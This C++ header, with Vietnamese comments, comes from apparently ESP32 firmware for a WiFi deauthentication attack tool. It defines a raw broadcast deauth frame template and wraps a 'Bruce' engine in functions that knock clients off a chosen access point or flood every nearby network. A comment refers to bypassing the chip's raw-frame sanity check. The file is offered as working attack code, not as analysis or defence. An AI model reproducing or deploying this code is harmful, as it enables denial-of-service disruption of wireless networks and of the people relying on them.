#pragma once

/*
 * ============================================================
 *  deauth.hpp  (UPDATED - Tich hop Bruce Deauther Engine)
 * ============================================================
 *  File goc giu nguyen vi tuong thich nguoc (WiFi_DeauthAP,
 *  WiFi_DeauthAll) nhung tat ca logic gio chay qua
 *  Bruce engine trong deauth_bruce.hpp
 * ============================================================
 */

#include "utils.hpp"
#include <vector>

// ============================================================
//  WSL BYPASS - cho phep gui raw management frame
// ============================================================
// Khai bao o deauth_bruce.hpp roi, tranh khai bao lai
// extern "C" int ieee80211_raw_frame_sanity_check(...);

// ============================================================
//  Frame template (giu lai de scan.hpp tuong thich)
// ============================================================
static const uint8_t deauth_frame_template[] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence Control
    0x07, 0x00                          // Reason 7
};

// ============================================================
//  WiFi Init (giu lai de utils.hpp goi)
// ============================================================
inline void WiFi_Init()
{
    if (WiFi.getMode() == WIFI_MODE_NULL) {
        WiFi.mode(WIFI_STA);
        delay(100);
    }
}

// ============================================================
//  WiFi_DeauthAP  →  Bao Bruce_DeauthAll
//  (giu API cu, scan.hpp goi ham nay)
// ============================================================
void WiFi_DeauthAP(const uint8_t* bssid, String ap_name, uint8_t chan = 1)
{
    // Goi Bruce engine
    extern void Bruce_DeauthAll(const uint8_t*, uint8_t, const char*);
    Bruce_DeauthAll(bssid, chan, ap_name.c_str());
}

// ============================================================
//  WiFi_DeauthAll  →  Bao Bruce_DeauthFlood
//  (giu API cu, scan.hpp goi ham nay)
// ============================================================
void WiFi_DeauthAll(const std::vector<APRecord>& aps)
{
    // Dung Bruce flood engine (re-scan va tan cong tat ca AP)
    extern void Bruce_DeauthFlood();
    Bruce_DeauthFlood();
}

